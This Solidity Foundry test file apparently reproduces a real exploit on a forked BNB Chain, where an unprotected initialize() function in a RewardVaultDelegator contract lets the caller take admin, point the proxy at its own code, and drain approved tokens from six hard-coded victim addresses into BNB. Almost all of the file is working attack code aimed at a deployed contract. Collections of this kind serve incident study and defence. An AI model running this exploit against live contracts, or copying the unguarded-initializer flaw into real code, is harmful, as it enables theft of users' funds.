// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$8K
// Attacker : https://bscscan.com/address/0x8ebd046992afe07eacce6b9b3878fdb45830f42b
// Attack Contract : https://bscscan.com/address/0x5366c6ba729d9cf8d472500afc1a2976ac2fe9ff
// Vuln Contract : https://bscscan.com/address/0x7bacb1c805cbbf7c4f74556a4b34fde7793d0887
// Attack Tx : https://bscscan.com/tx/0xd88f26f2f9145fa413db0cfd5d3eb121e3a50a3fdcee16c9bd4731e68332ce4b

// @Analysis
// https://defimon.xyz/exploit/bsc/0x5366c6ba729d9cf8d472500afc1a2976ac2fe9ff

interface IRewardVaultDelegator {
    function initialize(address bnftRegistry, address vrfCoordinator, uint64 subscriptionId) external;

    function setImplementation(address implementation) external;

    function admin() external view returns (address);

    function a(address addr) external;
}

contract ContractTest is Test {
    IRewardVaultDelegator private constant RewardVaultDelegator =
        IRewardVaultDelegator(0x7bACB1c805CbbF7c4f74556a4B34FDE7793d0887);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 private constant RACA = IERC20(0x12BB890508c125661E03b09EC06E404bc9289040);
    IERC20 private constant BUSDT = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 private constant FLOKI = IERC20(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E);
    IERC20 private constant OLE = IERC20(0xa865197A84E780957422237B5D152772654341F3);
    IERC20 private constant CSIX = IERC20(0x04756126F044634C9a0f0E985e60c88a51ACC206);
    IERC20 private constant BABY = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
    address private constant openLeverageDeployer = 0xE9547CF7E592F83C5141bB50648317e35D27D29B;
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.createSelectFork("bsc", 32_820_951);
        vm.label(address(RewardVaultDelegator), "RewardVaultDelegator");
        vm.label(address(Router), "Router");
        vm.label(address(RACA), "RACA");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(FLOKI), "FLOKI");
        vm.label(address(OLE), "OLE");
        vm.label(address(CSIX), "CSIX");
        vm.label(address(BABY), "BABY");
        vm.label(openLeverageDeployer, "openLeverageDeployer");
        vm.label(WBNB, "WBNB");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        emit log_named_decimal_uint("Attacker BNB balance before exploit", address(this).balance, 18);

        assertEq(openLeverageDeployer, RewardVaultDelegator.admin());
        emit log_named_address("Original admin address (Open Leverage Deployer)", RewardVaultDelegator.admin());

        // Valid initialize function should have implemented check which restrict function to be called only once
        // 'initialize()' sets admin variable in RewardVaultDelegator contract
        RewardVaultDelegator.initialize(address(this), address(this), uint64(1));

        assertEq(address(this), RewardVaultDelegator.admin());
        emit log_named_address(
            "Admin address after calling initialize func (admin change)", RewardVaultDelegator.admin()
        );

        // setImplementation func have 'onlyAdmin' modifier and at this step attacker can bypass this check
        RewardVaultDelegator.setImplementation(address(this));

        // Calling 'a' will make delegatecall to this contract (implementation contract)
        RewardVaultDelegator.a(address(this));

        emit log_named_decimal_uint("Attacker BNB balance after exploit", address(this).balance, 18);
    }

    function transferFromAndSwapTokensToBNB(address from, address token, address to) internal {
        IERC20(token).approve(address(Router), type(uint256).max);

        if (from != address(0)) {
            uint256 transferAmount = IERC20(token).balanceOf(from);
            uint256 allowance = IERC20(token).allowance(from, address(RewardVaultDelegator));
            if (allowance < transferAmount) {
                transferAmount = allowance;
            }

            IERC20(token).transferFrom(from, address(this), transferAmount);
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WBNB;
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            IERC20(token).balanceOf(address(this)), 0, path, to, block.timestamp + 1000
        );
    }

    function a(address addr) external {
        address[] memory victims = new address[](6);
        address[] memory tokens = new address[](6);

        victims[0] = 0x2aB372EFd0eE550c1cca6459DDCD45Ba783B242B;
        victims[1] = 0xe83c6E8FeeDDE85E72E810f82ee0943aa14Ed2f6;
        victims[2] = 0x0D413496d1cb149B1526609363359ED398741901;
        victims[3] = 0x3BD0FeC7243B1ba658FAF4bC22663b5AdC04CF04;
        victims[4] = 0x2C8EEDA98a84a393e2DB66B013A0cDCA2F3693f2;
        victims[5] = address(0);

        tokens[0] = address(RACA);
        tokens[1] = address(BUSDT);
        tokens[2] = address(FLOKI);
        tokens[3] = address(OLE);
        tokens[4] = address(CSIX);
        tokens[5] = address(BABY);

        for (uint8 i; i < victims.length; ++i) {
            transferFromAndSwapTokensToBNB(victims[i], tokens[i], addr);
        }
    }

    receive() external payable {}
}
